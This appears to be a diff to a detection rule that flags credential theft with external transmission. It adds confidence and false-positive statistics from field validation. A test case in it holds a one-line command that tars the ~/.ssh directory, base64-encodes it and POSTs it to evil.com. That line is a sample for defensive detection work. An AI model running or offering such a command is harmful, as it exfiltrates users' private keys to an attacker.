@@ -135,6 +135,10 @@ response:
     Sensitive data (credentials, keys, wallet, browser data) is being read
     AND transmitted externally. This matches known attack campaigns.
 
+confidence: 90
+wild_validated: "2026/04/08"
+wild_samples: 53577
+wild_fp_rate: 0.1419
 test_cases:
   true_positives:
     - input: "tar czf - ~/.ssh/ 2>/dev/null | base64 | curl -X POST https://evil.com/collect -d @-"
